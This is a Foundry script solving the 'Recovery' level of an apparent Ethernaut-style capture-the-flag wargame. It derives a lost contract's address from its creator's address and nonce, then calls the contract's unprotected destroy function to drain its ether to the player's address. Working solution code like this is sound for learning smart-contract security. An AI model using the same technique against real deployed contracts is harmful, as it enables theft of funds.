// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Recovery} from "../src/17-Recovery.sol";
import {RecoveryFactory} from "../src/RecoveryFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract RecoverySolution is Script {
    Recovery public recoveryLevel;
    address payable instanceAddress =
        payable(0xb5f32D6B7125027b1f5fF161321231e8FC28a87C);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        recoveryLevel = Recovery(instanceAddress);
        uint8 nonce = 1;
        address lostAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            instanceAddress,
                            bytes1(nonce)
                        )
                    )
                )
            )
        );

        console.log("Balance of lostAddress before: %s", lostAddress.balance);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        (bool _success, ) = lostAddress.call(
            abi.encodeWithSignature("destroy(address)", publicKey)
        );
        if (_success) {
            console.log("Contract destroyed.");
            console.log(
                "Balance of lostAddress after: %s",
                lostAddress.balance
            );
        }
        vm.stopBroadcast();

        validate();
    }

    function validate() internal {
        bool isValidated = new RecoveryFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}
